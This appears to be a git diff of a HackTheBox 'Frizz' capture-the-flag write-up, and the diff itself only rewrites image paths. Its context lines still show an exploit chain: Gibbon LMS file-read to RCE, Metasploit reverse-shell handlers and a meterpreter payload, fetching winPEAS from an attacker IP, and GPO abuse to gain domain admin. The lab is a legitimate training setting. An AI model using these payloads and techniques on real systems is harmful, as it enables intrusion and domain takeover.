@@ -34,12 +34,12 @@ sticker: emoji//1f9d4-200d-2640-fe0f
 
 We got a website on port `80`, this machine does not have initial credentials so we cannot perform initial enumeration on ports that require authentication, let's check the web application:
 
-![](../images/Pasted%20image%2020250616142828.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616142828.png)
 
 
 If we check the source code we can find this:
 
-![](../images/Pasted%20image%2020250616142853.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616142853.png)
 
 
 
@@ -55,16 +55,16 @@ Want to learn hacking but don't want to go to jabl/ YovÇlq°Rearn the auxrxalog
 
 On the source code we can see this too:
 
-![](../images/Pasted%20image%2020250616143718.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616143718.png)
 
 There's a `Gibbon LMS` directory on here, if we check it, we can find this:
 
-![](../images/Pasted%20image%2020250616143754.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616143754.png)
 
 We find a login page but more importantly, we can find this is running `Gibbon 25.0`, if we search for an exploit, we can find this:
 
 
-![](../images/Pasted%20image%2020250616165721.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616165721.png)
 
 We find `LFI` regarding this version, there's a python script that automates the process, let's use it:
 
@@ -88,13 +88,13 @@ python3 CVE-2023.34598.py scan http://frizzdc.frizz.htb/gibbon-lms
 
 Unfortunately for us, the sql file does not contain any relevant info as users, seems like a waste then, if we check for any other exploit on this version, we can find:
 
-![](../images/Pasted%20image%2020250616170727.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616170727.png)
 
 We find `CVE-2023-34878` this is a vuln which talks about arbitrary file read that leads to rce, if we search for an exploiit, we can find this one:
 
 Exploit: https://github.com/0xyy66/CVE-2023-45878_to_RCE
 
-![](../images/Pasted%20image%2020250616171019.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616171019.png)
 
 Let's do the exploit, we need a Metasploit listener using multi handler, we can use this simple one liner to start it:
 
@@ -105,7 +105,7 @@ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_t
 Now, start the exploit:
 
 
-![](../images/Pasted%20image%2020250616171931.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616171931.png)
 
 As seen, we get a reverse shell as:
 
@@ -296,7 +296,7 @@ We can find `mysql.exe` on `C:\xampp\mysql\bin`, let's use the credentials we fo
 .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"
 ```
 
-![](../images/Pasted%20image%2020250616172526.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616172526.png)
 
 We got `gibbon` and test, let's search tables on gibbon:
 
@@ -626,7 +626,7 @@ f.frizzle:Jenni_Luvs_Magic23
 
 If we remember from the scan, `winrm` is not enabled on this machine, we need to use ssh which is actually enabled on default port `22`, let's go into ssh:
 
-![](../images/Pasted%20image%2020250616173906.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616173906.png)
 
 
 If we try going into ssh the normal way, we get what can be seen above, we need to set up a few things before, yes, this part was a little annoying but here's what you need to do, on this point onwards, I will use kali instead of arch as I usually do:
@@ -664,7 +664,7 @@ Now we can do;
 ssh -o PreferredAuthentications=gssapi-with-mic -o GSSAPIAuthentication=yes f.frizzle@frizz.htb -K
 ```
 
-![](../images/Pasted%20image%2020250616175003.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616175003.png)
 
 Got our shell, let's proceed to privilege escalation.
 
@@ -688,16 +688,16 @@ MATCH (n)
 DETACH DELETE n
 ```
 
-![](../images/Pasted%20image%2020250616175626.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616175626.png)
 
 An interesting finding is that `M.SCHOOLBUS` owns a bunch of users, and got `WriteGPLink` over domain controllers and class_frizz:
 
-![](../images/Pasted%20image%2020250616175812.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616175812.png)
 
 Class_frizz contains `v.frizzle` which is a domain admin user:
 
-![](../images/Pasted%20image%2020250616175932.png)
-![](../images/Pasted%20image%2020250616175942.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616175932.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616175942.png)
 
 Nothing more relevant can be found on here, so seems like we need to check how to get into `M.SCHOOLBUS` on ssh, let's try using `winpwas` to have a further understanding of what we can do on here, you can get winpeas.ps1 on your linux machine and download it using:
 
@@ -705,7 +705,7 @@ Nothing more relevant can be found on here, so seems like we need to check how t
 Invoke-WebRequest http://IP:8000/winPEAS.ps1 -OutFile C:\Users\f.frizzle\winpeas.ps1
 ```
 
-![](../images/Pasted%20image%2020250616182652.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616182652.png)
 
 Some relevant info was found but nothing too relevant, following the tip of the recycle bin, I searched for files that may have been deleted and may be on there, let's use these Powershell commands:
 
@@ -717,7 +717,7 @@ $recycleBin.items() | Select-Object Name, Path
 
 We can see this:
 
-![](../images/Pasted%20image%2020250616182951.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616182951.png)
 
 We got a `wapt-backup-sunday.7z` file, there's a backup on the recycle bin what we can restore the file with this:
 
@@ -730,7 +730,7 @@ $documents = (New-Object -ComObject Shell.Application).NameSpace($documentsPath)
 $documents.MoveHere($item)
 ```
 
-![](../images/Pasted%20image%2020250616183103.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616183103.png)
 
 We can now see the file on our desktop, we need a way to download it, this can be done using `meterpreter`, let's do the following:
 
@@ -752,7 +752,7 @@ windows/meterpreter/reverse_tcp
 
 Run the `meterpreter.exe` and you will get a shell:
 
-![](../images/Pasted%20image%2020250616183827.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616183827.png)
 
 Now we can download our file:
 
@@ -834,7 +834,7 @@ export KRB5CCNAME=M.SchoolBus.ccache
 ssh -o PreferredAuthentications=gssapi-with-mic -o GSSAPIAuthentication=yes M.SchoolBus@frizz.htb -K
 ```
 
-![](../images/Pasted%20image%2020250616184457.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616184457.png)
 
 Ok, the last step we need is to exploit that we are able to create a GPO as shown in bloodhound, for this, we can use `SharpGPOABUSE`:
 
@@ -852,7 +852,7 @@ Once we got our file, we can begin, first of all we must create the GPO over dom
 New-GPO -Name New-GPO | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
 ```
 
-![](../images/Pasted%20image%2020250616185424.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616185424.png)
 
 
 Now, we can use the tool in our new GPO to get the same privilege as admin:
@@ -861,7 +861,7 @@ Now, we can use the tool in our new GPO to get the same privilege as admin:
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName New-GPO --force
 ```
 
-![](../images/Pasted%20image%2020250616185448.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616185448.png)
 
 Now we need to update:
 
@@ -869,9 +869,9 @@ Now we need to update:
 gpupdate /force
 ```
 
-![](../images/Pasted%20image%2020250616191049.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616191049.png)
 
-![](../images/Pasted%20image%2020250616193341.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616193341.png)
 
 As seen, we got same rights as admin, after that using `runasCS` we can send ourselves a shell or read the root flag:
 
@@ -891,7 +891,7 @@ REPO: https://github.com/antonioCoco/RunasCs/releases
 
 Unzip the file and you will get it:
 
-![](../images/Pasted%20image%2020250616185949.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616185949.png)
 
 Now, use the same method to get it on our windows machine:
 
@@ -918,7 +918,7 @@ PS C:\Users\M.SchoolBus> .\RunasCs.exe M.SchoolBus "!suBcig@MehTed!R" "cmd /c ty
 79cf6d3be2e1e49b4a39a156a363eb9e
 ```
 
-![](../images/Pasted%20image%2020250616194457.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250616194457.png)
 
 https://www.hackthebox.com/achievement/machine/1872557/652
 
